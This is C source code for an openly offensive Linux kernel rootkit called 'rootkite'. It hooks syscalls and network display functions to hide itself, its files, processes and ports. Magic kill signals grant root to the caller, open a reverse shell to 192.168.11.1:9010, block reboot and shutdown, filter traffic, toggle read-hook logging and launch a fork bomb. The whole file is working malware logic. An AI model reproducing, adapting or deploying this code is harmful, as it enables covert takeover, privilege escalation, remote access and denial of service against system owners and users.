#include <linux/init.h> // macros to mark up functions
#include <linux/module.h> // core header for loading lkms into the kernel
#include <linux/kernel.h> // types, macros, functions for kernel
#include <linux/kallsyms.h> // functions for kallsyms actions
#include <linux/unistd.h> // syscalls macros (checks for 32 bit and defines accordinly)
#include <linux/reboot.h> // reboot function


#include "kite_hook.h"
#include "device_handler.h"
#include "mod_hider.h"
#include "root_setter.h"
#include "getdents_hacks.h"
#include "hide_process.h"
#include "hide_ports.h"
#include "files_hacks.h"
#include "netfilter_kite.h"
#include "forkbomb.h"
#include "keylogger.h"
#include "execve_blocker.h"


MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("rootkite");
MODULE_AUTHOR("NondairyDig");
MODULE_VERSION("1.0");


#ifdef PTREGS_SYSCALL_STUB
static asmlinkage int hack_reboot(const struct pt_regs *regs){
    return -1; //return error when trying to reboot
}
#else
static asmlinkage int hack_reboot(int magic1, int magic2, unsigned int cmd, void* arg){
    return -1;
}
#endif

#ifdef PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs); // pretty self explanatory, in the README, activate and hook desired capabilities
static struct ftrace_hook ACTIVE_HOOKS[] = {
    HOOK("__x64_sys_getdents64", hack_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hack_getdents, &orig_getdents),
    HOOK("__x64_sys_kill", hack_kill, &orig_kill),
    HOOK("__x64_sys_reboot", hack_reboot, &orig_reboot),
    HOOK("__x64_sys_openat", hack_openat, &orig_openat),
    HOOK("__x64_sys_pread64", hack_pread64, &orig_pread64),
    HOOK("__x64_sys_statx", hack_statx, &orig_statx),
    HOOK("__x64_sys_read", hack_read, &orig_read),
    HOOK("__x64_sys_execve", hack_execve, &orig_execve),
    HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show),
    HOOK("packet_rcv", hack_packet_rcv, &orig_packet_rcv),
    HOOK("tpacket_rcv", hack_tpacket_rcv, &orig_tpacket_rcv),
    HOOK("packet_rcv_spkt", hack_packet_rcv_spkt, &orig_packet_rcv_spkt)
};
#else
static asmlinkage long hack_kill(pid_t pid, int sig);
static struct ftrace_hook ACTIVE_HOOKS[] = {
    HOOK("sys_getdents64", hack_getdents64, &orig_getdents64),
    HOOK("sys_getdents", hack_getdents, &orig_getdents),
    HOOK("sys_kill", hack_kill, &orig_kill),
    HOOK("sys_read", hack_read, &orig_read),
    HOOK("sys_reboot", hack_reboot, &orig_reboot),
    HOOK("sys_openat", hack_openat, &orig_openat),
    HOOK("sys_pread64", hack_pread64, &orig_pread64),
    HOOK("sys_statx", hack_statx, &orig_statx),
    HOOK("sys_execve", hack_execve, &orig_execve),
    HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show),
    HOOK("packet_rcv", hack_packet_rcv, &orig_packet_rcv),
    HOOK("tpacket_rcv", hack_tpacket_rcv, &orig_tpacket_rcv),
    HOOK("packet_rcv_spkt", hack_packet_rcv_spkt, &orig_packet_rcv_spkt)
};
#endif
#ifdef PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self explanatory, in the README, activate and hook desired capabilities
    int sig = regs->si;
    int pid = regs->di;
    if ((sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            printk(KERN_INFO "Hide rootkite\n");
            hide_mod();
        }
        else{
            printk(KERN_INFO "Show rootkite\n");
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        printk(KERN_INFO "Setting root for calling process\n");
        set_root();
        return 0;
    }
    else if ((sig == 64) && (pid == 3)){
        start_reverse_shell("192.168.11.1", "9010");
        insert_node(&ports_to_hide, "9010");
    }
    else if ((sig == 64) && (pid == 4)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_read") == 1){
            printk(KERN_ERR "error hooking syscall read\n");
        }
    }
    else if ((sig == 64) && (pid == 5)){
        rooted();
        insert_node(&files_to_hide, "rootkite.ko");
        //insert_node(&files_to_hide, "ath_pci.conf");
    }
    else if ((sig == 63) && (pid == 1)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_openat") == 1){
            printk(KERN_ERR "error hooking syscall openat\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_pread64") == 1){
            printk(KERN_ERR "error hooking syscall openat\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_statx") == 1){
            printk(KERN_ERR "error hooking syscall statx\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp4_seq_show") == 1){
            printk(KERN_ERR "error hooking tcp4_seq_show\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp6_seq_show") == 1){
            printk(KERN_ERR "error hooking tcp6_seq_show\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp4_seq_show") == 1){
            printk(KERN_ERR "error hooking udp4_seq_show\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp6_seq_show") == 1){
            printk(KERN_ERR "error hooking udp6_seq_show\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "packet_rcv") == 1){
            printk(KERN_ERR "error hooking packet_rcv\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "tpacket_rcv") == 1){
            printk(KERN_ERR "error hooking tpacket_rcv\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"packet_rcv_spkt") == 1){
            printk(KERN_ERR "error hooking packet_rcv_spkt\n");
        }
        switch_hide_process();
    }
    else if ((sig == 63) && (pid == 2)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
        }
        if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
            insert_node(&exec_to_block, "shutdown");
        }
        else{
            remove_node_by_name(&exec_to_block, "shutdown");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
                printk(KERN_ERR "error hooking syscall execve\n");
        }
    }
    else if ((sig == 63) && (pid == 3)){
        switch_net_hook(); // block traffic to specified ports and block ICMP
    }
    else if ((sig == 63) && (pid == 4)){
        start_bombing_run();
    }
    return orig_kill(regs);
}
#else
static asmlinkage long hack_kill(pid_t pid, int sig){
    if ((sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            printk(KERN_INFO "Hide rootkite\n");
            hide_mod();
        }
        else{
            printk(KERN_INFO "Show rootkite\n");
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        printk(KERN_INFO "Setting root for calling process\n");
        set_root();
        return 0;
    }
    else if ((sig == 64) && (pid == 3)){
        start_reverse_shell("192.168.11.1", "9010");
        insert_node(&ports_to_hide, "9010");
    }
    else if ((sig == 64) && (pid == 4)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_read") == 1){
            printk(KERN_ERR "error hooking syscall read\n");
        }
    }
    else if ((sig == 64) && (pid == 5)){
        rooted();
        insert_node(&files_to_hide, "rootkite.ko");
        //insert_node(&files_to_hide, "ath_pci.conf");
    }
    else if ((sig == 63) && (pid == 1)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_openat") == 1){
            printk(KERN_ERR "error hooking syscall openat\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_pread64") == 1){
            printk(KERN_ERR "error hooking syscall openat\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_statx") == 1){
            printk(KERN_ERR "error hooking syscall statx\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp4_seq_show") == 1){
            printk(KERN_ERR "error hooking tcp4_seq_show\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp6_seq_show") == 1){
            printk(KERN_ERR "error hooking tcp6_seq_show\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp4_seq_show") == 1){
            printk(KERN_ERR "error hooking udp4_seq_show\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp6_seq_show") == 1){
            printk(KERN_ERR "error hooking udp6_seq_show\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "packet_rcv") == 1){
            printk(KERN_ERR "error hooking packet_rcv\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "tpacket_rcv") == 1){
            printk(KERN_ERR "error hooking tpacket_rcv\n");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"packet_rcv_spkt") == 1){
            printk(KERN_ERR "error hooking packet_rcv_spkt\n");
        }
        switch_hide_process();
    }
    else if ((sig == 63) && (pid == 2)){
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
        }
        if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
            insert_node(&exec_to_block, "shutdown");
        }
        else{
            remove_node_by_name(&exec_to_block, "shutdown");
        }
        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
                printk(KERN_ERR "error hooking syscall execve\n");
        }
    }
    else if ((sig == 63) && (pid == 3)){
        switch_net_hook(); // block traffic to specified ports and block ICMP
    }
    else if ((sig == 63) && (pid == 4)){
        start_bombing_run();
    }
    return orig_kill(pid, sig);
}
#endif


static void cleanup(void){
    fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
    cleanup_lists();
    misc_deregister(&controller); // deregister the device controller
    if(hide_process_active == 1){
        switch_hide_process();
    }
    if(packet_blocker == 1){
        switch_net_hook();
    }
}


static int __init mod_init(void){
    printk(KERN_INFO "Activated rootkite, Initializing & Hooking Kill\n");
    misc_register(&controller); // register the device for interaction within filesystem
    if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
        printk(KERN_ERR "error hooking syscall %d\n", __NR_kill);
    }
    hide_ksyms();
    return 0;
}


static void __exit mod_exit(void){
    cleanup();
    printk(KERN_INFO "rootkite: exit\n");
}


module_init(mod_init);
module_exit(mod_exit);